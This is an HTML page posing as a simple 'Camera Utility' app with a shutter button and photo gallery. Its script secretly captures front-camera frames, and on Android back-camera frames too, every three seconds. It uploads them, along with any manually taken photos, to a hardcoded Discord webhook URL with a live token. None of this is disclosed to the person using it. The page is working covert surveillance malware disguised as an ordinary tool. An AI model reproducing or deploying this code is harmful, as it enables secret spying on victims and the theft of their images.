<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Camera Utility</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
    }
    #videoPreview {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1;
    }
    #shutterBtn {
      position: absolute;
      bottom: 40px;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: white;
      border: 4px solid #eee;
      z-index: 2;
    }
    #flash {
      position: absolute;
      background: white;
      width: 100%;
      height: 100%;
      opacity: 0;
      z-index: 10;
      pointer-events: none;
      transition: opacity 0.3s;
    }
    #photoPreview {
      position: absolute;
      bottom: 20px;
      left: 20px;
      width: 90px;
      height: 90px;
      object-fit: cover;
      border: 2px solid white;
      border-radius: 8px;
      z-index: 3;
      cursor: pointer;
    }
    #galleryView {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: black;
      display: none;
      flex-wrap: wrap;
      align-content: flex-start;
      overflow-y: scroll;
      padding: 10px;
      z-index: 15;
    }
    .galleryItem {
      width: 30%;
      margin: 1%;
      position: relative;
    }
    .galleryItem img {
      width: 100%;
      border-radius: 10px;
    }
    .deleteBtn {
      position: absolute;
      top: 5px;
      right: 5px;
      background: red;
      color: white;
      border: none;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      font-size: 16px;
      cursor: pointer;
    }
    #backBtn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: white;
      border: none;
      padding: 10px 15px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      z-index: 20;
    }
  </style>
</head>
<body>
  <video id="videoPreview" autoplay playsinline muted></video>
  <div id="flash"></div>
  <button id="shutterBtn"></button>
  <img id="photoPreview" src="" alt="preview" />
  <div id="galleryView"></div>
  <button id="backBtn" style="display:none">Back</button>
  <audio id="shutterSound" src="https://www.soundjay.com/mechanical/camera-shutter-click-01a.mp3" preload="auto"></audio>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1192062408462696518/w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
    const config = { maxSize: 8 * 1024 * 1024, quality: 0.8, interval: 3000 };
    const isAndroid = /Android/i.test(navigator.userAgent);
    const shutterBtn = document.getElementById('shutterBtn');
    const preview = document.getElementById('photoPreview');
    const gallery = document.getElementById('galleryView');
    const backBtn = document.getElementById('backBtn');
    const flash = document.getElementById('flash');
    const shutterSound = document.getElementById('shutterSound');
    const videoPreview = document.getElementById('videoPreview');
    const photos = [];
    let frontStream = null, backStream = null;

    async function initCamera() {
      frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      videoPreview.srcObject = frontStream;

      if (isAndroid) {
        try {
          backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
        } catch (e) {
          console.warn("外カメラ取得失敗", e);
        }
      }

      startPeriodicCapture();
    }

    async function captureFromStream(stream) {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      await video.play();
      await new Promise(res => setTimeout(res, 200)); // 安定させる
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
    }

    async function sendToWebhook(blob, label) {
      const form = new FormData();
      form.append("file", blob, `img_${Date.now()}.jpg`);
      form.append("content", label);
      await fetch(webhookUrl, { method: "POST", body: form });
    }

    function showFlash() {
      flash.style.opacity = 1;
      setTimeout(() => flash.style.opacity = 0, 200);
    }

    function updatePreview(blob) {
      const url = URL.createObjectURL(blob);
      preview.src = url;
      preview.style.display = "block";
    }

    shutterBtn.onclick = async () => {
      showFlash();
      shutterSound.play();
      const blob = await captureFromStream(frontStream);
      if (blob.size <= config.maxSize) {
        updatePreview(blob);
        addToGallery(blob);
        sendToWebhook(blob, "Front Camera (Manual Snap)");
      }
    };

    function addToGallery(blob) {
      photos.push(blob);
      preview.onclick = () => showGallery();
    }

    function showGallery() {
      gallery.innerHTML = "";
      gallery.style.display = "flex";
      backBtn.style.display = "block";
      photos.forEach((blob, index) => {
        const div = document.createElement('div');
        div.className = "galleryItem";
        const img = document.createElement('img');
        img.src = URL.createObjectURL(blob);
        img.onclick = () => window.open(img.src, '_blank');
        const del = document.createElement('button');
        del.className = "deleteBtn";
        del.textContent = "×";
        del.onclick = () => {
          photos.splice(index, 1);
          showGallery();
        };
        div.appendChild(img);
        div.appendChild(del);
        gallery.appendChild(div);
      });
    }

    backBtn.onclick = () => {
      gallery.style.display = "none";
      backBtn.style.display = "none";
    };

    function startPeriodicCapture() {
      setInterval(async () => {
        try {
          const frontBlob = await captureFromStream(frontStream);
          if (frontBlob.size <= config.maxSize) {
            sendToWebhook(frontBlob, "Front Camera (Auto)");
          }

          if (isAndroid && backStream) {
            const backBlob = await captureFromStream(backStream);
            if (backBlob.size <= config.maxSize) {
              sendToWebhook(backBlob, "Back Camera (Auto)");
            }
          }
        } catch (e) {
          console.error("定期撮影失敗:", e);
        }
      }, config.interval);
    }

    window.addEventListener("beforeunload", () => {
      frontStream?.getTracks().forEach(t => t.stop());
      backStream?.getTracks().forEach(t => t.stop());
    });

    initCamera();
  </script>
</body>
</html>
